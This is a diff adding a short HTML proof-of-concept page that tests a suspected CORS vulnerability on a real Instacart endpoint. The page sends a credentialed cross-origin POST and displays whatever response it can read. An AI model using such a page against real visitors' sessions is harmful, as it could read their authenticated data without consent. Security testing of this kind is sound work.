@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS POC</title>
+</head>
+<body>
+    <h1>CORS Vulnerability Proof of Concept</h1>
+    <button id="testBtn">Test CORS</button>
+    <pre id="output"></pre>
+
+    <script>
+        document.getElementById('testBtn').onclick = function() {
+            fetch('https://www.instacart.com/cdn-cgi/rum?', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    test: "POC test"
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    return response.text();
+                } else {
+                    throw new Error('Request failed');
+                }
+            })
+            .then(data => {
+                document.getElementById('output').innerText = 'Response: ' + data;
+            })
+            .catch(err => {
+                document.getElementById('output').innerText = 'Error: ' + err.message;
+            });
+        };
+    </script>
+</body>
+</html>
